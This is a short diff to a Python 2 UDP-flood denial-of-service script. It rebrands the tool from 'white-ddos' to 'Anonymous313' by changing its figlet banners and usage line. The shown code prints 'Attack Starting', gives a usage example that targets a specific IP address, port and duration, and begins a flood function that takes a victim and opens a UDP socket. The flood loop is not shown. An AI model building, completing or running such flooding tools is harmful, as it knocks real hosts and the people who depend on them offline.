@@ -5,7 +5,7 @@ import sys
 import os
 
 os.system("git pull")
-os.system("figlet white-ddos")
+os.system("figlet Anonymous313")
 print "Tool Devoloped By J4ncoksozan"
 print "starting in 5 seconds....."
 time.sleep(5)
@@ -15,9 +15,9 @@ os.system("figlet Attack Starting")
 time.sleep(3)
 
 def usage():
-	os.system("figlet white-ddos")
+	os.system("figlet Anonymous313")
 	print "Tool Devoloped By J4ncoksozan"
-        print "Usage : python2 white-ddos.py 196.220.60.200 80 100"
+        print "Usage : python2 Anonym313.py 196.220.60.200 80 100"
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
